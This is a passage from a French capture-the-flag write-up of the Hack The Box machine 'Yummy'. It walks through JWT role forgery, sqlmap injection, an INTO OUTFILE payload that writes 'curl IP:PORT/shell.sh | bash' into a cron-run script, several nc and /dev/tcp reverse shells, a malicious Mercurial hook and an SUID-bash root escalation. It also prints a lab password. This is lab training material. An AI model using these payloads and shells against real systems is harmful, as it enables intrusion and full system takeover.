</span></span><span style=display:flex><span><span style=color:#e06c75>decoded_payload</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>jwt</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>decode</span>(<span style=color:#e06c75>original_jwt</span>, <span style=color:#e06c75>signing_key</span>, <span style=color:#e06c75>algorithms</span><span style=color:#56b6c2>=</span>[<span style=color:#98c379>&#34;RS256&#34;</span>], <span style=color:#e06c75>options</span><span style=color:#56b6c2>=</span>{<span style=color:#98c379>&#34;verify_signature&#34;</span>: <span style=color:#e5c07b>False</span>})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>decoded_payload</span>[<span style=color:#98c379>&#39;role&#39;</span>] <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#39;administrator&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>new_jwt</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>jwt</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>encode</span>(<span style=color:#e06c75>decoded_payload</span>, <span style=color:#e06c75>signing_key</span>, <span style=color:#e06c75>algorithm</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#39;RS256&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#e06c75>new_jwt</span>)
</span></span></code></pre></div><p>Après avoir remplacé notre <code>X-AUTH-Token</code> par celui fourni par le script et rafraîchi la page, nous accédons à <code>http://yummy.htb/admindashboard</code>.</p><p>La seule nouveauté est que nous avons maintenant une fonction de recherche.</p><p><img src=/images/HTB-Yummy/admin_dashboard.png alt="admindashboard accessed"></p><h3 id=vulnérabilité-injection-sql>Vulnérabilité injection SQL</h3><p>Elle utilise le paramètre <code>o</code>.</p><p><img src=/images/HTB-Yummy/search_feature.png alt="search feature request"></p><p>Testons-le pour l&rsquo;injection SQL avec SQLmap.</p><p><img src=/images/HTB-Yummy/SQLi_test.png alt="SQLi test"></p><pre tabindex=0><code>sqlmap -r req.txt --batch
</code></pre><p>SQLmap identifie avec succès certains points d&rsquo;injection.</p><p><img src=/images/HTB-Yummy/sqli_points.png alt="SQL injections points"></p><p>Nous connaissons déjà le nom de la base de données, alors extrayons son contenu.</p><pre tabindex=0><code>sqlmap -r req.txt --level=5 --risk=3 -D yummy_db --dump --batch
</code></pre><p>Deux tables sont trouvées <code>appointments</code> et <code>users</code> mais elles ne contiennent rien d&rsquo;utile.</p><p><img src=/images/HTB-Yummy/appointments_tb.png alt="appointments table"></p><p><img src=/images/HTB-Yummy/users_tb.png alt="users table"></p><p>Nous vérifions également les privilèges de l&rsquo;utilisateur actuel.</p><pre tabindex=0><code>sqlmap -r req.txt --level=5 --risk=3 -D yummy_db --batch --privileges
</code></pre><p><img src=/images/HTB-Yummy/db_privs.png alt="database user privilege"></p><p>Sous MySQL, le privilège <code>FILE</code> donne à un utilisateur les permissions de lecture et d&rsquo;écriture sur le système de fichiers du serveur. Dans notre cas, cela signifie que l&rsquo;utilisateur <code>chef</code> peut :</p><ol><li>Lire des fichiers: Transférer des données depuis des fichiers sur le serveur dans les tables de la base de données en utilisant <code>LOAD DATA INFILE</code>.</li><li>Écrire des fichiers: Sauvegarder les résultats des requêtes dans des fichiers en utilisant <code>SELECT ... INTO OUTFILE</code>.</li><li>Modifier des fichiers: Écrire potentiellement un contenu arbitraire dans les fichiers, en fonction des permissions du répertoire.</li></ol><p>Nous nous rappelons que <code>dbmonitor.sh</code> est exécuté en tant qu&rsquo;utilisateur <code>mysql</code> toutes les minutes. Dans le script, il y a une condition pour exécuter le plus récent script avec <code>/data/scripts/fixer-v*</code> si <code>dbstatus.json</code> existe et ne mentionne pas que mysql est down (spécifiquement la chaîne de caractères <code>database is down</code>).</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#c678dd>else</span>
</span></span><span style=display:flex><span>    /usr/bin/rm -f /data/scripts/dbstatus.json
</span></span><span style=display:flex><span>    /usr/bin/echo <span style=color:#98c379>&#34;The automation failed in some way, attempting to fix it.&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>latest_version</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>/usr/bin/ls -1 /data/scripts/fixer-v* 2&gt;/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1<span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span>    /bin/bash <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$latest_version</span><span style=color:#98c379>&#34;</span>
</span></span></code></pre></div><h2 id=accès-initial-shell-en-tant-que-mysql>Accès Initial (Shell en tant que mysql)</h2><p>Nous pouvons donc insérer une chaîne dans <code>dbstatus.json</code> pour nous assurer que le fichier existe et déclenche l&rsquo;exécution du script dans <code>/data/scripts</code>.</p><ol><li>Nous injectons une chaîne dans <code>/data/scripts/dbstatus.json</code> avec <code>SELECT "hacked" INTO OUTFILE '/data/scripts/dbstatus.json';</code>. Le payload complet est le suivant:</li></ol><pre tabindex=0><code>/admindashboard?s=aa&amp;o=ASC%3b+select+&#34;hacked;&#34;+INTO+OUTFILE++&#39;/data/scripts/dbstatus.json&#39;+%3b
</code></pre><p><img src=/images/HTB-Yummy/insert_content.png alt="payload to insert content"></p><ol start=2><li>Ensuite, nous insérons une commande dans le script fixateur pour obtenir un reverse shell avec <code>curl IP:PORT/shell.sh | bash;</code></li></ol><blockquote><p>Nous aurons besoin de configurer un serveur web, la commande téléchargera notre script malveillant et l&rsquo;exécutera sur la cible.</p></blockquote><pre tabindex=0><code>/admindashboard?s=aa&amp;o=ASC%3b+select+&#34;curl+{IP}:{PORT}/shell.sh+|bash%3b&#34;+INTO+OUTFILE++&#39;/data/scripts/fixer-v___&#39;+%3b 
</code></pre><p><strong>FICHIER REVERSE SHELL</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span> 
</span></span><span style=display:flex><span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc <span style=color:#56b6c2>{</span>IP<span style=color:#56b6c2>}</span> <span style=color:#56b6c2>{</span>PORT<span style=color:#56b6c2>}</span> &gt;/tmp/f
</span></span></code></pre></div><p><img src=/images/HTB-Yummy/cmd_injection_yummy.png alt="command injection"></p><p>Sur notre listener, nous recevons une connexion en tant que <code>mysql</code>.</p><p><img src=/images/HTB-Yummy/foothold.png alt="Shell as myql"></p><h3 id=shell-en-tant-que-www-data>Shell en tant que www-data</h3><p>Nous savons qu&rsquo;il y a un autre job cron qui exécute <code>/data/scripts/app_backup.sh</code> en tant que <code>www-data</code> toutes les minutes. Nous pouvons donc remplacer <code>app_backup.sh</code> par un fichier reverse shell pour passer à cet utilisateur.</p><pre tabindex=0><code>*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
</code></pre><pre tabindex=0><code>mv app_backup.sh app_backup.sh.one

echo &#39;bash -i &gt;&amp; /dev/tcp/{IP}/{PORT} 0&gt;&amp;1&#39; &gt; revshell.sh

mv revshell.sh app_backup.sh
</code></pre><p><img src=/images/HTB-Yummy/privesc_wdata.png alt="www-data privilege escaltion"></p><p>Après environ une minute, nous avons un shell sous le nom de <code>www-data</code>.</p><p><img src=/images/HTB-Yummy/shell_wdata.png alt="www-data shell"></p><h3 id=shell-en-tant-que-qa>Shell en tant que qa</h3><p>Dans <code>/var/www/app-qatesting</code> nous trouvons un répertoire caché <code>.hg</code>.</p><p><img src=/images/HTB-Yummy/hg_dir.png alt="hg directory"></p><p>Cherchons des mots de passe avec <code>grep</code>.</p><pre tabindex=0><code>grep -rni &#34;password&#34; .
</code></pre><p><img src=/images/HTB-Yummy/grep_match.png alt="grep command"></p><p><code>grep</code> identifie une correspondance dans un fichier binaire, par défaut il n&rsquo;affiche pas son contenu. Nous pouvons y remédier avec l&rsquo;option <code>-- text</code>.</p><pre tabindex=0><code>grep -arni --text &#34;password&#34; .
</code></pre><p><img src=/images/HTB-Yummy/pwds_found.png alt="passwords found"></p><p>Deux mots de passe sont trouvés, le premier est le mot de passe de l&rsquo;utilisateur <code>chef</code>. Comme nous avons affaire à un fichier binaire, nous utilisons <code>strings</code> pour afficher les résultats.</p><pre tabindex=0><code>strings ./store/data/app.py.i | grep -A 10 -B 5 &#34;password&#34;
</code></pre><p>Nous découvrons le mot de passe de l&rsquo;utilisateur <code>qa</code>.</p><pre tabindex=0><code>qa:jPAd!XQCtn8Oc@2B
</code></pre><p><img src=/images/HTB-Yummy/qa_creds.png alt="user qa credentials"></p><p>Nous nous connectons avec succès en tant que <code>qa</code> avec ces informations d&rsquo;identification via SSH.</p><p><img src=/images/HTB-Yummy/user_text.png alt="user flag"></p><h3 id=shell-en-tant-que-dev>Shell en tant que dev</h3><p>L&rsquo;utilisateur actuel <code>qa</code> est capable d&rsquo;exécuter <code>/usr/bin/hg pull /home/dev/app-production/</code> en tant qu&rsquo;utilisateur <code>dev</code>.</p><p><img src=/images/HTB-Yummy/sudo_privs.png alt="qa sudo privileges"></p><p>La commande <code>hg</code> est utilisée pour l&rsquo;outil de gestion de contrôle de version Mercurial. La commande <code>hg pull</code> est utilisée pour mettre à jour un dépôt en y intégrant les modifications d&rsquo;un autre. Nous pouvons donc créer un répertoire <code>.hg</code> malveillant (c&rsquo;est dans ce répertoire que les dépôts Mercurial stockent leurs paramètres, comme <code>.git</code> pour Git). Nous injecterons ensuite un hook malveillant afin d&rsquo;exécuter notre commande reverse shell.</p><ol><li>Nous configurons notre dépôt malveillant</li></ol><pre tabindex=0><code>cd /tmp
mkdir .hg
chmod 777 .hg
cp ~/.hgrc .hg/hgrc  
</code></pre><blockquote><p>Le fichier <code>hgrc</code> est le fichier de configuration de Mercurial, il contient des paramètres tels que les chemins de dépôt et les hooks.</p></blockquote><p><img src=/images/HTB-Yummy/hg_files_creation.png alt="Mercurial file creation"></p><ol start=2><li>Nous ajoutons notre hook malveillant dans <code>/tmp/.hg/hgrc</code></li></ol><blockquote><p>Les hooks sont utilisés pour exécuter des commandes lors d&rsquo;événements spécifiques (dans notre exemple, <code>post-pull</code> s&rsquo;exécutera après le téléchargement des modifications).</p></blockquote><pre tabindex=0><code>[hooks]  
post-pull = /tmp/revshell.sh  
</code></pre><p><img src=/images/HTB-Yummy/hg_hooks.png alt="Mercurial hooks"></p><ol start=3><li>Ensuite, nous créons notre fichier <code>revshell.sh</code> dans le dossier <code>/tmp</code>.</li></ol><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash  
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>/bin/bash -i &gt;/dev/tcp/<span style=color:#56b6c2>{</span>IP<span style=color:#56b6c2>}</span>/<span style=color:#56b6c2>{</span>PORT<span style=color:#56b6c2>}</span> 0&lt;&amp;<span style=color:#d19a66>1</span> 2&gt;&amp;<span style=color:#d19a66>1</span>
</span></span></code></pre></div><ol start=4><li>Enfin, nous rendons le fichier reverse shell exécutable et exécutons la commande <code>hg</code>.</li></ol><pre tabindex=0><code>chmod +x /tmp/revshell.sh

sudo -u dev /usr/bin/hg pull /home/dev/app-production/
</code></pre><blockquote><p>N&rsquo;oubliez pas de démarrer le listener.</p></blockquote><p><img src=/images/HTB-Yummy/hg_cmd_exec.png alt="hg command execution"></p><p>Sur notre listener, nous obtenons un shell en tant que <code>dev</code> et nous découvrons que cet utilisateur peut exécuter <code>rsync</code> en tant que root pour synchroniser les fichiers de <code>/home/dev/app-production</code> avec <code>/opt/app</code> sans fournir de mot de passe.</p><h2 id=escalade-de-privilèges-shell-en-tant-que-root>Escalade de privilèges (Shell en tant que root)</h2><p><img src=/images/HTB-Yummy/dev_shell.png alt="shell as dev"></p><p>Nous pouvons copier un binaire, lui ajouter le bit SUID et changer son propriétaire en <code>root</code> afin d&rsquo;escalader nos privilèges et d&rsquo;obtenir un shell root.</p><pre tabindex=0><code>cd /home/dev/ 

cp /bin/bash app-production/bash  

chmod u+s app-production/bash  

sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/  

/opt/app/bash -p  
</code></pre><p><img src=/images/HTB-Yummy/root_flag.png alt="root flag"></p><h2 id=ressources-additionnelles>Ressources additionnelles</h2><p>J&rsquo;espère que cet article vous a été utile et je vous remercie d&rsquo;avoir pris le temps de le lire !</p><p>Voici quelques ressources pour en apprendre davantage sur les concepts de cette box:</p><ul><li><a href=https://tryhackme.com/room/publickeycrypto>Public Key Cryptography Basics</a> sur TryHackme.</li><li><a href=https://tryhackme.com/room/breakrsa>Breaking RSA</a> sur TryHackme.</li><li><a href=https://tryhackme.com/room/jwtsecurity>JWT Security</a> sur TryHackme.</li><li><a href=https://portswigger.net/web-security/jwt>JWT Attacks</a> sur PortSwigger Academy.</li><li><a href=https://academy.hackthebox.com/module/details/33>SQL Injection Fundamentals</a> et <a href=https://academy.hackthebox.com/module/details/58>SQLMap Essentials</a> sur HackTheBox Academy.</li></ul></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-cicada/>&#8592;
Précédent:
HTB: Cicada</a></p><p class=prev-post-date>février 13, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a><ul><li><a href=#vulnérabilité-lfi>Vulnérabilité LFI</a><ul><li><a href=#cron-jobs-découverts>Cron jobs découverts</a></li></ul></li><li><a href=#revue-du-code>Revue du code</a></li><li><a href=#vulnérabilité-injection-sql>Vulnérabilité injection SQL</a></li></ul></li><li><a href=#accès-initial-shell-en-tant-que-mysql>Accès Initial (Shell en tant que mysql)</a><ul><li><a href=#shell-en-tant-que-www-data>Shell en tant que www-data</a></li><li><a href=#shell-en-tant-que-qa>Shell en tant que qa</a></li><li><a href=#shell-en-tant-que-dev>Shell en tant que dev</a></li></ul></li><li><a href=#escalade-de-privilèges-shell-en-tant-que-root>Escalade de privilèges (Shell en tant que root)</a></li><li><a href=#ressources-additionnelles>Ressources additionnelles</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>